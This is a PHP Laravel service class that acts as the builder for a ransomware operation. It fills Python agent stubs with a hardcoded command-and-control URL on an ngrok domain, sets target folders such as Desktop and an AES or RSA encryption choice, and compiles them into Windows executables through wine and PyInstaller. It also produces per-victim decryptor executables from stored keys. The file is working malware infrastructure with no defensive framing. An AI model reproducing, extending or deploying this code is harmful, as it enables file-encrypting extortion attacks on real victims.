<?php

namespace App\Services;

class PayloadService
{
    public function createPayloadProfile($profileId, $platform = 'windows', array $options = [])
    {
        if (is_object($profileId)) {
            $options['encryption_type'] = $options['encryption_type'] ?? $profileId->encryption_type ?? 'aes';
            $options['target_directories'] = $options['target_directories'] ?? $profileId->target_directories ?? 'Desktop';
            $profileId = $profileId->id;
        } elseif (is_array($profileId)) {
            $options['encryption_type'] = $options['encryption_type'] ?? $profileId['encryption_type'] ?? 'aes';
            $options['target_directories'] = $options['target_directories'] ?? $profileId['target_directories'] ?? 'Desktop';
            $profileId = $profileId['id'] ?? uniqid();
        }

        $algorithm = strtoupper($options['encryption_type'] ?? 'AES');
        $targetDirs = $options['target_directories'] ?? 'Desktop';

        if (is_string($targetDirs) && str_starts_with(trim($targetDirs), '[')) {
            $decoded = json_decode($targetDirs, true);
            if (is_array($decoded) && count($decoded) > 0) {
                $targetDirs = $decoded;
            }
        }

        $tempDir = storage_path('app/temp/'.uniqid());
        if (! file_exists($tempDir)) {
            mkdir($tempDir, 0777, true);
        }

        $scriptPath = $tempDir.'/agent.py';
        $finalDir = storage_path('app/public/payloads');
        if (! file_exists($finalDir)) {
            mkdir($finalDir, 0777, true);
        }
        $finalPath = $finalDir.'/'.$profileId.'.exe';

        $code = $this->getClientCodeTemplate($targetDirs, $algorithm);
        file_put_contents($scriptPath, $code);

        if ($platform === 'windows') {
            $logPath = storage_path('app/temp/build_error.log');

            $command = sprintf(
                'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s %s > %s 2>&1 &',
                escapeshellarg($finalDir),
                escapeshellarg($scriptPath),
                escapeshellarg($logPath)
            );

            exec($command);
        }

        return $finalPath;
    }

    public function createDecryptorPayload($victim) {
        $algorithm = strtoupper($victim->encryption_type ?? 'AES');
        $decryptKey = ($algorithm === 'RSA') ? $victim->private_key : $victim->encryption_key;

        if (empty($decryptKey)) {
            return null;
        }

        $targetDirs = ['Desktop', 'Documents', 'Downloads']; 

        $stubFile = ($algorithm === 'RSA') 
            ? resource_path('stubs/rsa_decryptor.py') 
            : resource_path('stubs/aes_decryptor.py');

        $code = file_get_contents($stubFile);
        $dirsListPython = json_encode($targetDirs);

        $code = str_replace('__DECRYPT_KEY__', $decryptKey, $code);
        $code = str_replace('__PRIVATE_KEY__', $decryptKey, $code);
        $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);

        $tempDir = storage_path('app/temp/'.uniqid());
        if (!file_exists($tempDir)) {
            mkdir($tempDir, 0777, true);
        }

        $scriptPath = $tempDir.'/decryptor.py';
        $finalDir = storage_path('app/public/decryptors');
        if (!file_exists($finalDir)) {
            mkdir($finalDir, 0777, true);
        }
        
        $filename = 'decryptor_'.$victim->id.'.exe';
        $finalPath = $finalDir.'/'.$filename;

        file_put_contents($scriptPath, $code);

        $logPath = storage_path('app/temp/decrypt_build_error.log');
        $command = sprintf(
            'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s --name %s %s > %s 2>&1',
            escapeshellarg($finalDir),
            escapeshellarg('decryptor_'.$victim->id),
            escapeshellarg($scriptPath),
            escapeshellarg($logPath)
        );

        exec($command);

        return 'decryptors/'.$filename;
    }

    protected function getClientCodeTemplate($targetDirs, $algorithm) {
            $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';

            $algoClean = strtoupper(trim($algorithm));

            $stubFile = ($algoClean === 'RSA') 
                ? resource_path('stubs/rsa_agent.py') 
                : resource_path('stubs/aes_agent.py');

            if (!file_exists($stubFile)) {
                $stubFile = resource_path('stubs/aes_agent.py');
            }

            $code = file_get_contents($stubFile);

            $dirsListPython = is_array($targetDirs) ? json_encode($targetDirs) : json_encode([$targetDirs]);

            $code = str_replace('__C2_SERVER_URL__', $c2ServerUrl, $code);
            $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);

            return $code;
    }
}